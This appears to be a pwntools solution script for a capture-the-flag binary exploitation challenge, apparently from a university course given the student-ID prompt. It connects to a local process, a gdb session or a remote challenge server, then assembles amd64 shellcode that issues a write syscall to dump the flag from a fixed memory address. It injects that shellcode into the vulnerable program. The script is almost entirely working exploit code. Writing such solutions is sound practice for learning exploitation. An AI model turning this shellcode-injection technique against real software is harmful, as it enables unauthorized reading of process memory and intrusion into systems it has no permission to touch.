
from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        b *vuln+110
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve():
    p = conn()
    # p = process("./6")
    context.arch = 'amd64'

    # context.log_level = 'debug'
    p.sendlineafter(b"NIM:", b"13523035")
    p.sendlineafter(b"Challenge:", b"10")

    flag = 0x404120

    shellcode = asm(f"""
    mov rdi, 1              # Set rdi = 1 (stdout)
    mov rsi, {flag}         # Set rsi = address of the flag
    mov rdx, 0x90           # Set rdx = length of the flag
    mov rax, 1              # Set rax = syscall number for write
    syscall                 # Invoke the syscall
""")

    with open("payload.bin", "wb") as f:
        f.write(shellcode)

    # write your payload here
    p.sendline(shellcode) # meng-inject payload ke dalam binary
    p.interactive() # flush to stdout 

solve()

